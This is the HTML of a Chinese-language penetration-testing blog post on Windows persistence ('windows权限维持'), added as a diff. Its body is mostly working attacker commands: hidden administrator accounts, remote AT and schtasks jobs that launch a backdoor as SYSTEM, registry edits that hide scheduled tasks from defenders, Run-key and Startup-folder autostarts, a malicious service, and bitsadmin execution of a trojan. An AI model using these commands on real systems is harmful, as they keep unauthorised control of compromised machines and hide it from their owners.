@@ -1,0 +1,204 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>windows权限维持 | Flyink's blog</title><meta name="author" content="Flyink"><meta name="copyright" content="Flyink"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、隐藏账号1. 自建隐藏账号 net user test$ 123456 &#x2F;add &amp;&amp; net localgroup administrators test$  2. 激活Guest用户 net user guest 123456 &amp;&amp; net localgroup administrators guest &#x2F;add net user gue">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows权限维持">
+<meta property="og:url" content="https://timerings.github.io/posts/20086.html">
+<meta property="og:site_name" content="Flyink&#39;s blog">
+<meta property="og:description" content="一、隐藏账号1. 自建隐藏账号 net user test$ 123456 &#x2F;add &amp;&amp; net localgroup administrators test$  2. 激活Guest用户 net user guest 123456 &amp;&amp; net localgroup administrators guest &#x2F;add net user gue">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://timerings.github.io/img/14.png">
+<meta property="article:published_time" content="2023-10-23T14:19:30.000Z">
+<meta property="article:modified_time" content="2023-10-23T14:24:44.441Z">
+<meta property="article:author" content="Flyink">
+<meta property="article:tag" content="权限维持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://timerings.github.io/img/14.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://timerings.github.io/posts/20086.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'windows权限维持',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-23 22:24:44'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="/css/corner-indicator.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/14.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Flyink's blog"><span class="site-name">Flyink's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">windows权限维持</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-23T14:19:30.000Z" title="发表于 2023-10-23 22:19:30">2023-10-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-23T14:24:44.441Z" title="更新于 2023-10-23 22:24:44">2023-10-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="windows权限维持"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、隐藏账号"><a href="#一、隐藏账号" class="headerlink" title="一、隐藏账号"></a>一、隐藏账号</h1><h2 id="1-自建隐藏账号"><a href="#1-自建隐藏账号" class="headerlink" title="1. 自建隐藏账号"></a>1. 自建隐藏账号</h2><ul>
+<li>net user test$ 123456 &#x2F;add &amp;&amp; net localgroup administrators test$</li>
+</ul>
+<h2 id="2-激活Guest用户"><a href="#2-激活Guest用户" class="headerlink" title="2. 激活Guest用户"></a>2. 激活Guest用户</h2><ul>
+<li>net user guest 123456 &amp;&amp; net localgroup administrators guest &#x2F;add net user guest &#x2F;active:yes</li>
+</ul>
+<h1 id="二、计划任务"><a href="#二、计划任务" class="headerlink" title="二、计划任务"></a>二、计划任务</h1><h2 id="AT命令"><a href="#AT命令" class="headerlink" title="AT命令"></a>AT命令</h2><ol>
+<li>建立IPC$连接<br>net use \目标ip\ipc$”密码“ &#x2F;user:用户名 </li>
+<li>查看目标系统时间<br>net time \ip </li>
+<li>将后门文件拷贝到目标系统中<br>copy 中转机器路径 \目标ip\目标路径 </li>
+<li>指定执行时间<br>at \ip:时间 C:\windows\…（后门路径）</li>
+</ol>
+<p>注意：</p>
+<ul>
+<li>at \ip &#x2F;delete &#x2F;yes  #清除at记录 </li>
+<li>at \ip 15:33:36 cmd.exe &#x2F;C “ipconfig” &gt;C:&#x2F;”1.txt” type \ip\C$\1.txt<br>#读取命令执行之后的输出内容（type是读取文件命令）</li>
+</ul>
+<h2 id="schtasks（win-server2008及win7之后）"><a href="#schtasks（win-server2008及win7之后）" class="headerlink" title="schtasks（win server2008及win7之后）"></a>schtasks（win server2008及win7之后）</h2><h3 id="命令行："><a href="#命令行：" class="headerlink" title="命令行："></a>命令行：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /sc minute /mo 5/tn <span class="string">&quot;sd&quot;</span>/tr <span class="string">&quot;C:\Windows\System32\cmd.exe /c copy E\a.txt E:\a\a.php&quot;</span></span><br><span class="line">schtasks /CREATE /TN <span class="built_in">test</span> /TR C:\windows(后门路径.exe) /SC once /RU SYSTEM /ST 10:30  <span class="comment"># 创建计划任务</span></span><br><span class="line"><span class="comment"># /TN 指定任务名称，/TR 参数指定运行的恶意命令，/ST 指定运行时间，/SC 指定运行周期， /ED 指定任务终止日期</span></span><br><span class="line"><span class="comment"># 任务创建，将会自动在目录 %SystemRoot%\System32\Tasks 生成一个关于该任务的描述性 XML 文件，包含了所有的任务信息</span></span><br><span class="line">schtasks  /End  /Tn  evaltest  <span class="comment"># 停止计划任务</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="powershell："><a href="#powershell：" class="headerlink" title="powershell："></a>powershell：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$taskname</span> = <span class="string">&quot;test&quot;</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;cmd.exe&quot;</span></span><br><span class="line"><span class="variable">$cmdargs</span> = <span class="string">&quot;/c calc.exe&quot;</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;<span class="variable">$env</span>:username&quot;</span></span><br><span class="line"><span class="comment">#$username = &quot;SYSTEM&quot;</span></span><br><span class="line"><span class="variable">$taskdescription</span> = <span class="string">&quot;test task&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = New-ScheduledTaskAction -Execute <span class="variable">$cmd</span> -Argument <span class="variable">$cmdargs</span></span><br><span class="line"><span class="variable">$trigger</span> = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -minutes 1)</span><br><span class="line"><span class="variable">$settings</span> = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 0) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)</span><br><span class="line">Register-ScheduledTask -Action <span class="variable">$action</span> -Trigger <span class="variable">$trigger</span> -TaskName <span class="variable">$taskname</span> -Description <span class="variable">$taskdescription</span> -Settings <span class="variable">$settings</span> -User <span class="variable">$username</span> -RunLevel 1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除：Unregister-ScheduledTask -TaskName test -Confirm:$false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="计划任务隐藏"><a href="#计划任务隐藏" class="headerlink" title="计划任务隐藏"></a>计划任务隐藏</h3><h4 id="非完全隐藏"><a href="#非完全隐藏" class="headerlink" title="非完全隐藏"></a>非完全隐藏</h4><p>如果想要隐藏一个计划任务，可以通过修改 Schedule\TaskCache\Tree 中对应任务的 Index 值，一般情况下都是 3，步骤如下：<br>启动 SYSTEM 权限 cmd：psexec64  -i -s cmd.exe<br>执行 regedit 以 SYSTEM 权限启动注册表编辑器<br>修改 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree 下对应任务的 Index 值为 0<br>删除 %SystemRoot%\System32\Tasks 下任务对应的 XML 文件</p>
+<p>优点： - 利用 taskschd.msc、schtasks 甚至系统API查询出的所有任务中，都看不到该任务<br>缺点： - 并非完全隐藏，如果知道该任务的名字，可以通过 schtasks &#x2F;query &#x2F;tn {TaskName} 查到 - 无论是低权的任务还是高权，都需要 SYSTEM 权限（在win10测试，低版本好像没这个要求，待测试）</p>
+<h4 id="完全隐藏"><a href="#完全隐藏" class="headerlink" title="完全隐藏"></a>完全隐藏</h4><p>按道理，是可以通过配置任务 SD 实现。在一次测试过程中，偶然删除了注册表中的 SD 项，发现无论什么方式都查不到任务信息，达到完全隐藏的目的：</p>
+<p>启动 SYSTEM 权限 cmd：psexec64  -i -s cmd.exe<br>执行 regedit 以 SYSTEM 权限启动注册表编辑器<br>删除 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree{TaskName}\SD<br>删除 %SystemRoot%\System32\Tasks 下任务对应的 XML 文件</p>
+<p>优点： - 无论何种方式（除了注册表），都查不到该任务，较为彻底<br>缺点： - 无论是低权的任务还是高权，都需要 SYSTEM 权限</p>
+<h1 id="三、注册表自启动"><a href="#三、注册表自启动" class="headerlink" title="三、注册表自启动"></a>三、注册表自启动</h1><p><strong>注册表相关启动项地方</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户级：</span></span><br><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line"><span class="comment"># 系统级 ：</span></span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce </span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run </span><br><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>
+
+<p><strong>只需要新建一个字符串类型的键，然后把路径输进去即可</strong></p>
+<img src="/posts/20086/winq-1.png" class="">
+<img src="/posts/20086/winq-2.png" class="">
+<p><strong>之后重启就会直接弹出 cmd 窗口，实现注册表自启动项</strong><br><strong>命令行–重启后执行恶意程序（需要完全管理员权限&#x2F;system，否则提示拒绝）</strong><br><strong>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v “Keyname” &#x2F;t REG_SZ &#x2F;d “C:\Windows\System32\calc.exe” &#x2F;f 确认可以使用成功</strong></p>
+<img src="/posts/20086/winq-3,png" class="">
+
+<h1 id="四、开机自启"><a href="#四、开机自启" class="headerlink" title="四、开机自启"></a>四、开机自启</h1><h2 id="启动文件夹下"><a href="#启动文件夹下" class="headerlink" title="启动文件夹下"></a>启动文件夹下</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move   cmd2.exe    <span class="string">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\cmd2.exe&quot;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">move   cmd2.exe   <span class="string">&quot;C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="设置开机自启动服务（高权限）"><a href="#设置开机自启动服务（高权限）" class="headerlink" title="设置开机自启动服务（高权限）"></a>设置开机自启动服务（高权限）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc create <span class="string">&quot;server config&quot;</span> binpath= <span class="string">&quot;C:\Users\Administrator\Desktop\artifact.exe&quot;</span></span><br><span class="line"></span><br><span class="line">sc description <span class="string">&quot;server config&quot;</span> <span class="string">&quot;description&quot;</span> <span class="comment"># 设置服务的描述字符串</span></span><br><span class="line">sc config <span class="string">&quot;server config&quot;</span> start= auto <span class="comment"># 设置这个服务为自动启动</span></span><br><span class="line">net start <span class="string">&quot;server config&quot;</span> <span class="comment"># 启动服务</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="五、bitsadmin"><a href="#五、bitsadmin" class="headerlink" title="五、bitsadmin"></a>五、bitsadmin</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /create abc</span><br><span class="line">bitsadmin /addfile abc <span class="string">&quot;木马目录&quot;</span> <span class="string">&quot;目的木马目录&quot;</span></span><br><span class="line">bitsadmin.exe /SetNotifyCmdLine abc <span class="string">&quot;目的木马目录&quot;</span> NUL</span><br><span class="line">bitsadmin /Resume abc</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://timerings.github.io">Flyink</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://timerings.github.io/posts/20086.html">https://timerings.github.io/posts/20086.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://timerings.github.io" target="_blank">Flyink's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">权限维持</a></div><div class="post_share"><div class="social-share" data-image="/img/14.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/13837.html" title="域管权限维持"><img class="cover" src="/img/10.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">域管权限维持</div></div></a></div><div class="next-post pull-right"><a href="/posts/17071.html" title="HTB-Stocker"><img class="cover" src="/img/15.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">HTB-Stocker</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/13837.html" title="域管权限维持"><img class="cover" src="/img/10.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-23</div><div class="title">域管权限维持</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Flyink</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Timerings"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7"><span class="toc-text">一、隐藏账号</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%87%AA%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E5%8F%B7"><span class="toc-text">1. 自建隐藏账号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BF%80%E6%B4%BBGuest%E7%94%A8%E6%88%B7"><span class="toc-text">2. 激活Guest用户</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">二、计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#AT%E5%91%BD%E4%BB%A4"><span class="toc-text">AT命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#schtasks%EF%BC%88win-server2008%E5%8F%8Awin7%E4%B9%8B%E5%90%8E%EF%BC%89"><span class="toc-text">schtasks（win server2008及win7之后）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9A"><span class="toc-text">命令行：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%EF%BC%9A"><span class="toc-text">powershell：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E9%9A%90%E8%97%8F"><span class="toc-text">计划任务隐藏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9D%9E%E5%AE%8C%E5%85%A8%E9%9A%90%E8%97%8F"><span class="toc-text">非完全隐藏</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E5%85%A8%E9%9A%90%E8%97%8F"><span class="toc-text">完全隐藏</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-text">三、注册表自启动</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF"><span class="toc-text">四、开机自启</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B"><span class="toc-text">启动文件夹下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1%EF%BC%88%E9%AB%98%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-text">设置开机自启动服务（高权限）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81bitsadmin"><span class="toc-text">五、bitsadmin</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/13837.html" title="域管权限维持"><img src="/img/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域管权限维持"/></a><div class="content"><a class="title" href="/posts/13837.html" title="域管权限维持">域管权限维持</a><time datetime="2023-10-23T14:33:07.000Z" title="发表于 2023-10-23 22:33:07">2023-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/20086.html" title="windows权限维持"><img src="/img/14.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="windows权限维持"/></a><div class="content"><a class="title" href="/posts/20086.html" title="windows权限维持">windows权限维持</a><time datetime="2023-10-23T14:19:30.000Z" title="发表于 2023-10-23 22:19:30">2023-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/17071.html" title="HTB-Stocker"><img src="/img/15.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Stocker"/></a><div class="content"><a class="title" href="/posts/17071.html" title="HTB-Stocker">HTB-Stocker</a><time datetime="2023-10-23T11:09:20.000Z" title="发表于 2023-10-23 19:09:20">2023-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/21416.html" title="HTB-Soccer"><img src="/img/6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Soccer"/></a><div class="content"><a class="title" href="/posts/21416.html" title="HTB-Soccer">HTB-Soccer</a><time datetime="2023-10-23T11:06:17.000Z" title="发表于 2023-10-23 19:06:17">2023-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/55242.html" title="HTB-Metatwo"><img src="/img/11.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Metatwo"/></a><div class="content"><a class="title" href="/posts/55242.html" title="HTB-Metatwo">HTB-Metatwo</a><time datetime="2023-10-23T11:00:15.000Z" title="发表于 2023-10-23 19:00:15">2023-10-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/14.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Flyink</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
